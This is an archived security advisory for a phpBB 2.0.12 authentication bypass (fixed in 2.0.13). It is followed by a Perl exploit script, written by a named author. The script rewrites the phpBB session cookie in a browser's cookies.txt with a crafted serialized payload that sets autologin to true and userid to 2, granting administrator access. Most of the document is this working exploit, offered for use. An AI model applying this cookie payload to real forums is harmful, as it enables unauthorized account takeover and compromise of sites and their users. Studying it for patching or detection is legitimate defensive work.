source: http://www.securityfocus.com/bid/12678/info
 
phpBB is affected by an authentication bypass vulnerability.
 
This issue is due to the application failing to properly sanitize user-supplied input during authentication.
 
Exploitation of this vulnerability would permit unauthorized access to any known account including the administrator account.
 
The vendor has addressed this issue in phpBB 2.0.13.

#!/usr/bin/perl

#   phpBB 2.0.12 Session Handling Administrator Authentication
#   Bypass EXPLOIT
#   written by phuket
#
#   The discoverer of this bug is unknown, says "Paiserist" who wrote a C exploit
for this bug.
#     http://packetstormsecurity.org/0503-exploits/phpbbsession.c
#
#

#  I tested this code with Firefox on my linux box, I do not know if it works
with mozilla or on #windows
#  $url is the name of the cookie ( www.phpbb.com / $url= phpbb.com ) Look at
cookies.txt for the name of the cookie

#  I wrote this exploit after reading "phpBB 2.0.12 Session Handling
Administrator Authentication #Bypass    -SIMPLIFIED-"  By PPC^Rebyte
#  and it is based on his code
#
# Sorry for my bad english :/

$file = "/////cookies.txt" ; # path to your cookies.txt
$url = $ARGV[0];

open (FILE , '<'."$file" ) or die ('File does not exist')  ; # path to your
cookies.txt file
@cookie= <FILE> ;
close FILE ;


$exploit =
"a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bb%3A1%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D"
;

foreach $i (@cookie)
{
        if ($i=~/$url/) {

$i
=~s/a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bs%3A(.*?)%3A%22(.*?)%22%3B%7D/$exploit/
;
print "OK\n" ;
}

}

open (FILE , '>'."$file") or die ('Can not write Cookie') ; ;
print FILE @cookie ;
close FILE ;

#greetings to Jubeltrubel,Julien S.,crosbow,XFlorian,Nibble,Trasher and Invi ;)
#thx to Paiserist,PPC^Rebyte and to the unknown discoverer of this bug :)
#phuket